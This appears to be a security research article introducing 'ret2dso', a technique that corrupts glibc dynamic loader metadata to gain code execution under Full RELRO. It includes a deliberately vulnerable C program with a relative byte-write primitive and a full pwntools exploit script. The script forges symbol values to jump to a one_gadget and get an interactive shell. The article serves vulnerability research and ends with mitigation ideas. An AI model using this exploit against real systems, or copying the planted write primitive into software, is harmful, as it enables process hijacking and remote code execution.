![Intro picture](https://lowlevel.re/uploads/1769474495548.png)

## Abstract

`ret2dlresolve` is commonly considered obsolete on modern Linux systems due to **Full RELRO**, **eager binding**, and the removal of writable GOT entries.
This paper demonstrates that this assumption is **incomplete**.

We introduce **ret2dso**, a runtime exploitation technique that regains **arbitrary code execution under Full RELRO**, **without PLT**, **without GOT**, and **without absolute address disclosures**, by corrupting **dynamic loader metadata of already-loaded DSOs**.

Rather than explicitly forcing the dynamic linker to resolve a symbol, ret2dso abuses **legitimate runtime resolution paths** and the loader’s implicit trust in its own metadata, resulting in **direct control of RIP**.

This paper intentionally separates **invariant**, **mechanism**, and **demonstration**, and presents a fully detailed end-to-end proof-of-concept.

---

## 1. Threat Model

We assume the attacker has:

- An **arbitrary memory write primitive**
    - possibly byte-granular
    - possibly relative
- **No memory read primitive**
- **No absolute address disclosure**
- ASLR, PIE, NX, **Full RELRO**, IBT, SHSTK enabled

The origin of the primitive (heap overflow, stack corruption, type confusion, etc.) is out of scope.

This threat model reflects modern post-mitigation exploitation scenarios where disclosure is unavailable but partial corruption remains possible.

---

## 2. ret2dlresolve — The Underlying Invariant

Classic `ret2dlresolve` relies on forging relocation records and invoking the PLT to coerce the dynamic loader into resolving attacker-controlled symbols.

The PLT itself is not fundamental.

> **Invariant:**  
> If the dynamic loader resolves a symbol using attacker-controlled metadata, arbitrary code execution follows.

ret2dso preserves this invariant while eliminating all dependencies on:

- PLT stubs
- GOT entries
- lazy binding
- writable relocation records

---

## 3. Loader Internals

Each loaded object is represented by a `struct link_map`:

```c
struct link_map {
    Elf64_Addr l_addr;
    char *l_name;
    Elf64_Dyn *l_ld;
    struct link_map *l_next, *l_prev;
    Elf64_Dyn *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM];
};
```

Key observations:

- `link_map` structures persist for the lifetime of the process
- Several fields remain writable even under Full RELRO
- Runtime subsystems consult loader metadata long after startup

---

## 4. Resolution Semantics

During symbol resolution, the dynamic loader computes:

```
resolved_address = sym->st_value + l_addr
```

No bounds checking or semantic validation is applied to `st_value`.
Control over this field is sufficient to redirect execution.

The loader implicitly trusts all metadata reachable via `link_map`.

When the resolved symbol is later dereferenced as a function pointer, control flow is transferred directly to `sym->st_value + l_addr`, resulting in direct control of RIP.

---

## 5. Runtime Resolution Surface

Despite eager binding:

- DSO enumeration remains active
- Runtime symbol lookup paths persist
- libc subsystems (notably stdio) consult loader state

### Entry into `_dl_find_dso_for_object`

![dso_find_for_object](https://lowlevel.re/uploads/1769473291923.png)

### Resolution flowing into `execvpe`

![dso_for_object_execvpe](https://lowlevel.re/uploads/1769473294957.png)

---

## 6. Relativity Under ASLR

> **Note on ASLR and relative mappings**  
> Linux ASLR does not guarantee fixed relative offsets between DSOs. However, the dynamic loader enforces
> a constrained and ordered mapping of core objects (ld.so, libc, stdio globals).
> ret2dso does not rely on an exact offset, but on the existence of a loader-relative writable region
> reachable from a stable anchor object (e.g. `_IO_2_1_stdin_`) using a weak write primitive.

ASLR randomizes absolute addresses, but in practice the dynamic loader enforces a constrained and ordered mapping of core DSOs. While this stability is empirical rather than guaranteed, ret2dso does not rely on a fixed offset:

- `stdin` ↔ libc
- libc ↔ ld.so
- loader writable segments ↔ loader metadata

ret2dso relies solely on **relative positioning**, not absolute disclosure.

---

## 7. ELF Symbol Forgery

An ELF symbol is defined as:

```c
typedef struct {
    Elf64_Word  st_name;
    unsigned char st_info;
    unsigned char st_other;
    Elf64_Half  st_shndx;
    Elf64_Addr  st_value;
    Elf64_Xword st_size;
} Elf64_Sym;
```

In the resolution path exercised here, only `st_value` contributes to the final control-flow transfer.
Other fields are either ignored or used exclusively for bookkeeping and consistency checks.

As a result, a forged symbol entry may reuse all fields from a legitimate symbol, modifying only `st_value` to redirect execution.

---

## 8. Proof of Concept — Vulnerable Program (Detailed Walkthrough)

The vulnerable program intentionally exposes a **relative, byte-wise arbitrary write** primitive anchored at `stdin`. The full source is reproduced below to ensure the proof-of-concept is **self-contained and reproducible**.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <link.h>
#include <string.h>

extern struct r_debug _r_debug;

static void get_distance(void) {
    struct link_map *lm = _r_debug.r_map;
    uintptr_t stdin_addr = (uintptr_t)stdin;

    while (lm) {
        if (lm->l_name && strstr(lm->l_name, "ld-linux")) {
            uintptr_t ld_base = (uintptr_t)lm->l_addr;
            intptr_t drift = (intptr_t)ld_base - (intptr_t)stdin_addr;
            printf("ld distance: %lx\n", (uint64_t)drift);
            break;
        }
        lm = lm->l_next;
    }
}

static void drift_write(void) {
    long delta;
    unsigned int byte;

    puts("format: <delta> <byte>");

    for (int i = 0; i < 30; i++) {
        if (scanf("%ld %x", &delta, &byte) != 2)
            break;

        /*
         * stdin is used as a globally reachable anchor into libc memory.
         * The attacker controls only a relative offset and a single byte.
         */
        ((unsigned char*)stdin)[delta] = (unsigned char)byte;
    }
}

int main(void) {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);

    /* Establish relative layout between stdin and ld.so */
    get_distance();

    /* Expose relative byte-wise write primitive */
    drift_write();

    _exit(0);
}
```

### Why this models real-world bugs

This program captures several properties commonly seen in post-mitigation exploitation:

- the attacker has **no memory disclosure**
- writes are **relative**, not absolute
- corruption is **byte-granular and limited**
- a globally reachable object (`stdin`) is abused as an anchor

---

## 9. Proof of Concept — Exploit (Step-by-Step)

The following exploit abuses the relative write primitive to corrupt loader metadata and redirect execution. The full exploit is shown below, followed by a detailed breakdown.

```python
from pwn import *

context.binary = ELF("dist/ret2dso")
context.log_level = "info"

STDIN_VTABLE_OFFSET       = 0xd8
LDBASE_WRITABLE_OFFSET    = 0x3a000
LINFO_SYMTAB_OFFSET       = 0xb60
DSO_SYM_ENTRY_OFFSET      = 0x208
ONE_GADGET_OFFSET         = 0x12ee1a

def drift_write(io, target, data):
    for i, b in enumerate(data):
        io.sendline(f"{target + i} {b:02x}".encode())

p = remote("localhost", 1447)

p.recvuntil(b"distance: ")
entropy = int(p.recvline().strip(), 16)

# Compute forged st_value so that st_value + l_addr == one_gadget
st_value = -(entropy + ONE_GADGET_OFFSET) & 0xffffffffffffffff

# Fake ELF symbol entry: all fields copied except st_value
fake_sym = (
    p64(0x19) +                    # st_name (copied)
    p64(0xd001200000020) +         # st_info / st_other / st_shndx / st_size
    p64(st_value)                  # forged st_value
)

# 1. Redirect DT_SYMTAB pointer inside loader metadata
target = entropy + LDBASE_WRITABLE_OFFSET + LINFO_SYMTAB_OFFSET
drift_write(p, target, b"\xf0")

# 2. Overwrite a concrete symbol entry with the forged Elf64_Sym
target = entropy + LDBASE_WRITABLE_OFFSET + DSO_SYM_ENTRY_OFFSET
drift_write(p, target, fake_sym)

# 3. Corrupt a single byte in stdin FILE structure to trigger resolution
target = STDIN_VTABLE_OFFSET + 7
drift_write(p, target, b"\xff")

p.interactive()
```

### Offset Rationale

- `STDIN_VTABLE_OFFSET`: single-byte corruption used to redirect control into a libc path that performs symbol resolution
- `LDBASE_WRITABLE_OFFSET`: lands in a writable loader mapping despite Full RELRO
- `LINFO_SYMTAB_OFFSET`: points to the loader’s internal `DT_SYMTAB` pointer
- `DSO_SYM_ENTRY_OFFSET`: indexes a legitimate symbol entry reused as a template

All offsets are relative and do not require absolute addresses.

### Fake Symbol Semantics

The forged symbol reuses all fields of a legitimate entry except `st_value`. When the loader computes:

```
resolved = sym->st_value + l_addr
```

control flow is redirected directly to the attacker-chosen gadget.

---

## 10. Exploit Result

![exploit_finished](https://lowlevel.re/uploads/1769473297928.png)

---

## 11. Security Implications

- Full RELRO does not protect loader metadata
- Loader runtime state remains mutable and implicitly trusted
- Weak write primitives are sufficient for full control-flow hijack

---

## 12. Mitigation Discussion

Potential mitigations include:

- Making loader metadata read-only post-relocation
- Hardening runtime resolution paths
- Validating symbol contents before use

All approaches carry significant compatibility or performance costs.

---

## 13. Conclusion

ret2dso generalizes the invariant behind ret2dlresolve and demonstrates that dynamic loader metadata remains a viable attack surface under modern hardening.

Removing PLT and writable GOT entries does not eliminate the fundamental trust assumptions of runtime symbol resolution.

Web article at: https://lowlevel.re/article/ret2dso-runtime-ret2dlresolve-under-full-relro